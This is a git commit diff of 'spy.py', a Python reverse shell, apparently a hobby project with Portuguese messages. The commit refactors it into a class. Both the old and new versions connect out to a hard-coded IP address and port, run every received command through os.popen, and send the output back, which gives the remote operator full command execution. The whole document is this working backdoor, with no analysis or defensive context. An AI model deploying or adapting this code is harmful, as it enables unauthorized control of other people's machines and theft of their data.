ebff53344ef095b01eb2ecf2a47053e8b6a7dd5e
Lucas Buarque <47061990+nLucasx@users.noreply.github.com>
2019-12-10 11:01:07 -0300

    Add files via upload

--- spy.py
+++ spy.py
@@ -1,30 +1,52 @@
 import socket, os
 
-ip = "192.168.15.104"
-port = 1230
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((ip, port))
-init = "============= CONNECTED =============\n"
-s.send(init.encode())
+class reverse:
+    background = "============= CONNECTED =============\n"
 
-while True:
-    s.send(b'Spy >> ')
-    r = s.recv(1024)
-    result = r.decode()
-    result = result.replace('\n', '')
+    def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    def receive(self):
+        self.result = self.s.recv(1024).decode()
+        self.result = self.result.replace('\n', '')
+    
+    def deliver(self, message):
+        self.s.send(message.encode())
+    
+    def connect(self):
+        self.s.connect((self.ip, self.port))
+        self.deliver(self.background)
 
-    if (result.startswith('cd')):
-        os.chdir(result[3:])
-        sent = "Diretório atual : " + str(os.getcwd()) + '\n'
-        s.send(sent.encode())
-    elif (result == 'pwd'):
-        sent = "Diretório atual : "+ str(os.getcwd()) + '\n'
-        s.send(sent.encode())
-    elif (result == 'q'):
-        sent = "Saindo...\n"
-        s.send(sent.encode())
-        s.close()
-        break
-    else:
-        message = os.popen(result).read();
-        s.send(message.encode())
+    def close(self):
+        self.s.close()
+
+
+def main():
+    shell = reverse('172.16.33.189', 4441)
+    shell.connect()
+    stay = True
+    while stay:
+        shell.deliver('Spy >> ')
+        shell.receive()
+
+        if ('not found' in shell.result):
+            print('teste')
+
+        elif (shell.result.startswith('cd')):
+            os.chdir(shell.result[3:])
+            sent = "Diretório atual : " + str(os.getcwd()) + '\n'
+        elif (shell.result == 'pwd'):
+            sent = "Diretório atual : "+ str(os.getcwd()) + '\n'
+        elif (shell.result == 'q'):
+            sent = "Saindo...\n"
+            stay = False
+        else:
+            sent = os.popen(shell.result).read()
+        
+        shell.deliver(sent)
+    
+    shell.close()
+
+main()
